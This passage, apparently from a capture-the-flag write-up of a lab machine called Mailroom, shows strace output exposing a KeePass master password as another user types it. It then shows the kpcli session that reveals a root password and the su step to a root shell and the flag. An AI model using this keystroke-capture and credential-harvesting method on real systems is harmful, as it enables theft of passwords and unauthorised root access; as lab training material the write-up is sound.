      7 geteuid
      4 getpid
      4 getegid
      3 getuid
      3 getgid
      2 munmap
      2 getgroups
      1 utimes
      1 unlink
      1 lstat
      1 getrandom
      1 exit_group
      1 +++ exited with 0 +++

```

A good place to start is with `read` and `write`. For a program like `kpcli`, that will capture the stuff written to the terminal (`write`) and the stuff read from STDIN (`read`). On a quick look, there’s a bunch of `EAGAIN` messages that I don’t think I need, so I’ll `grep` those out as well:

```

matthew@mailroom:~$ cat out2 | grep -e read -e write | grep -v EAGAIN
read(3, "p", 1)                         = 1
write(4, "p", 1)                        = 1
read(3, "e", 1)                         = 1
write(4, "e", 1)                        = 1
read(3, "n", 1)                         = 1
write(4, "n", 1)                        = 1
read(3, " ", 1)                         = 1
write(4, " ", 1)                        = 1
read(3, "/", 1)                         = 1
write(4, "/", 1)                        = 1
read(3, "h", 1)                         = 1
write(4, "h", 1)                        = 1
...[snip]...

```

It starts by reading `open /home/matthew/personal.kdbx`, and then it asks for the password to the database and reads it in:

```

write(1, "Please provide the master passwo"..., 36) = 36
read(0, "!", 8192)                      = 1
write(1, "*", 1)                        = 1
read(0, "s", 8192)                      = 1
write(1, "*", 1)                        = 1
read(0, "E", 8192)                      = 1
write(1, "*", 1)                        = 1
read(0, "c", 8192)                      = 1
write(1, "*", 1)                        = 1
read(0, "U", 8192)                      = 1
write(1, "*", 1)                        = 1
read(0, "r", 8192)                      = 1
write(1, "*", 1)                        = 1
read(0, "3", 8192)                      = 1
write(1, "*", 1)                        = 1
read(0, "p", 8192)                      = 1
write(1, "*", 1)                        = 1
read(0, "4", 8192)                      = 1
write(1, "*", 1)                        = 1
read(0, "$", 8192)                      = 1
write(1, "*", 1)                        = 1
read(0, "$", 8192)                      = 1
write(1, "*", 1)                        = 1
read(0, "w", 8192)                      = 1
write(1, "*", 1)                        = 1
read(0, "0", 8192)                      = 1
write(1, "*", 1)                        = 1
read(0, "1", 8192)                      = 1
write(1, "*", 1)                        = 1
read(0, "\10", 8192)                    = 1
write(1, "\10 \10", 3)                  = 3
read(0, "r", 8192)                      = 1
write(1, "*", 1)                        = 1
read(0, "d", 8192)                      = 1
write(1, "*", 1)                        = 1
read(0, "9", 8192)                      = 1
write(1, "*", 1)                        = 1
read(0, "\n", 8192)                     = 1
write(1, "*********", 9)                = 9
write(1, "\n", 1)                       = 1
read(5, "\3\331\242\232g\373K\265\1\0\3\0\2\20\0001\301\362\346\277qCP\276X\5!j\374Z\377\3"..., 8192) = 1998
read(5, "\npackage Compress::Raw::Zlib;\n\nr"..., 8192) = 8192
read(5, " if $validate && $value !~ /^\\d+"..., 8192) = 8192
read(5, "    croak \"Compress::Raw::Zlib::"..., 8192) = 8192
read(5, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0)\0\0\0\0\0\0"..., 832) = 832

```

After reading it, it decompresses it! The characters typed are `!sEcUr3p4$$w01\10rd9`. It’s important to notes that “\10” is octal for 8 which is the ASCII backspace! So the password is `!sEcUr3p4$$w0rd9`.

### Shell

#### KeePass

The password works to access the KeePass DB:

```

matthew@mailroom:~$ kpcli --kdb personal.kdbx
Please provide the master password: *************************

KeePass CLI (kpcli) v3.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/>

```

There’s one group named `Root`:

```

kpcli:/> ls
=== Groups ===
Root/
kpcli:/> cd Root/
kpcli:/Root>

```

It has five passwords:

```

kpcli:/Root> ls
=== Entries ===
0. food account                                            door.dash.local
1. GItea Admin account                                    git.mailroom.htb
2. gitea database password
3. My Gitea Account                                       git.mailroom.htb
4. root acc

```

“root acc” sounds interesting:

```

kpcli:/Root> show -f 4

 Path: /Root/
Title: root acc
Uname: root
 Pass: a$gBa3!GA8
  URL:
Notes: root account for sysadmin jobs

```

#### su

That password works to get to the root account using `su`:

```

matthew@mailroom:~$ su -
Password:
root@mailroom:~#

```

And read the root flag:

```

root@mailroom:~# cat root.txt
cc9cf628************************

```

## Beyond Root

I wanted to take a look at the automation scripts and what was causing me to get dropped from tracing with my loop. I’ll walk through that in this [quick video](https://www.youtube.com/watch?v=pQrjQLktqss):